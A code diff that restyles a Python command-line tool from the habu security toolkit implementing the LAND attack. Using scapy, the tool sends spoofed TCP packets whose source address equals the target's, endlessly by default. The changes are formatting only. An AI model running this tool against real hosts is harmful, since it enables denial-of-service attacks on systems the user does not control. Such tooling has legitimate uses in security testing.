@@ -1,21 +1,23 @@
 #!/usr/bin/env python3
 
-import sys
 import logging
+import sys
+
 import click
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-from habu.lib.iface import search_iface
 from scapy.all import IP, TCP, conf, send
+
+from habu.lib.iface import search_iface
 
 
 @click.command()
-@click.argument('ip')
-@click.option('-c', 'count', default=0, help='How many packets send (default: infinit)')
-@click.option('-p', 'port', default=135, help='Port to use (default: 135)')
-@click.option('-i', 'iface', default=None, help='Interface to use')
-@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
+@click.argument("ip")
+@click.option("-c", "count", default=0, help="How many packets send (default: infinit)")
+@click.option("-p", "port", default=135, help="Port to use (default: 135)")
+@click.option("-i", "iface", default=None, help="Interface to use")
+@click.option("-v", "verbose", is_flag=True, default=False, help="Verbose")
 def cmd_land(ip, count, port, iface, verbose):
     """This command implements the LAND attack, that sends packets forging the
     source IP address to be the same that the destination IP. Also uses the
@@ -39,9 +41,13 @@ def cmd_land(ip, count, port, iface, verbose):
     if iface:
         iface = search_iface(iface)
         if iface:
-            conf.iface = iface['name']
+            conf.iface = iface["name"]
         else:
-            logging.error('Interface {} not found. Use habu.interfaces to show valid network interfaces'.format(iface))
+            logging.error(
+                "Interface {} not found. Use habu.interfaces to show valid network interfaces".format(
+                    iface
+                )
+            )
             return False
 
     layer3 = IP()
@@ -63,7 +69,7 @@ def cmd_land(ip, count, port, iface, verbose):
         if verbose:
             print(pkt.summary())
         else:
-            print('.', end='')
+            print(".", end="")
             sys.stdout.flush()
 
         if count != 0 and counter == count:
@@ -71,5 +77,6 @@ def cmd_land(ip, count, port, iface, verbose):
 
     return True
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     cmd_land()
